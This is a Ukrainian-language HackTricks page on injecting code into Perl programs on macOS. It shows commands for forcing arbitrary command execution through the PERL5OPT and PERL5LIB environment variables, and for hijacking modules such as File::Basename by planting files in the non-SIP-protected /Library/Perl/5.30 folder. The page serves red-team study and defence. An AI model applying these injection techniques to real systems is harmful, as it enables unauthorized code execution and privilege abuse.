# Внедрення Perl-додатків в macOS

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## Через змінну середовища `PERL5OPT` та `PERL5LIB`

За допомогою змінної середовища PERL5OPT можна змусити perl виконувати довільні команди.\
Наприклад, створіть цей скрипт:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Зараз **експортуйте змінну середовища** та виконайте **perl** скрипт:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Ще один варіант - створити модуль Perl (наприклад, `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

А потім використовуйте змінні середовища:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Через залежності

Можливо вивести порядок папок залежностей Perl, які використовуються:
```bash
perl -e 'print join("\n", @INC)'
```
Який поверне щось на зразок:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Деякі з повернутих папок навіть не існують, однак **`/Library/Perl/5.30`** **існує**, вона **не** захищена **SIP** і знаходиться **перед** папками, які захищені **SIP**. Тому хтось може зловживати цією папкою, щоб додати в неї залежності від скриптів, щоб високопривілейний Perl-скрипт завантажував їх.

{% hint style="warning" %}
Проте, слід зауважити, що вам **потрібно бути root, щоб писати в цю папку**, і в наш час ви отримаєте цей **запит TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Наприклад, якщо скрипт імпортує **`use File::Basename;`**, можна створити `/Library/Perl/5.30/File/Basename.pm`, щоб виконати довільний код.

## References

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
